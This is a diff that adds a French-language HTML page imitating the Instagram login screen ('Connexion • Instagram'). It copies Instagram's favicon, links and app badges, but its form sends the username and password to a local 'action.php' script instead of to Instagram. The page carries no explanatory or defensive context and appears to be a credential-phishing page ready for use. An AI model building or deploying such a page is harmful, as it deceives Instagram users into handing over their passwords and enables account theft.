@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+	<title>Connexion • Instagram</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+	<link rel="stylesheet" type="text/css" href="main.css">
+	<link rel="preconnect" href="https://fonts.googleapis.com">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link href="https://fonts.googleapis.com/css2?family=Open+Sans&display=swap" rel="stylesheet">
+	<link rel="shortcut icon" href="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" type="image/ico">
+	<!-- JQuery etc-->
+	<script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+	<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+	<!-- JQuery etc-->
+	<meta charset="utf-8">
+</head>
+<body>
+	<div class="form">
+		<img src="Pictures/head.png" id="head-logo">
+		<form action="action.php" method="post" class="info">
+			<input class="uname" type="text" name="username" placeholder="Num. téléphone, nom d’utilisateur ou e-mail" required>
+			<br>
+			<input class="password" type="password" name="password" placeholder="Mot de passe" required>
+			<br>
+			<button class="button" type="submit"><span class="connect">Connexion</span></button>
+		</form>
+		<div class="wrapper">
+			<div class="other-option">
+				<p class="other-option-text">ou</p>
+			</div>
+		</div>
+		<div class="reset">
+			<a href="https://www.instagram.com/accounts/password/reset/" class="link-reset">Mot de passe oublié ?</a>
+		</div>
+	</div>
+	<div class="reg-wrapper">
+		<p class="reg-text">Vous n’avez pas de compte  ? <a href="https://www.instagram.com/accounts/emailsignup/" class="reg-link">Inscrivez-vous</a></p>
+	</div>
+	<p class="dl">Téléchargez l’application.</p>
+	<div class="apps">
+		<a href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&amp;ct=igweb.loginPage.badge&amp;mt=8&amp;vt=lo" tabindex="0"><img alt="Disponible dans l’App Store" class="apple " src="/Pictures/appstore.png"></a>
+		<a href="https://play.google.com/store/apps/details?id=com.instagram.android&amp;referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DDE0B96E4-8924-47A4-BFC7-2AAF6B374168%26utm_content%3Dlo%26utm_medium%3Dbadge" tabindex="0"><img alt="Disponible dans Google Play" class="google " src="/Pictures/gplay.png"></a>
+	</div>
+</body>
+</html>
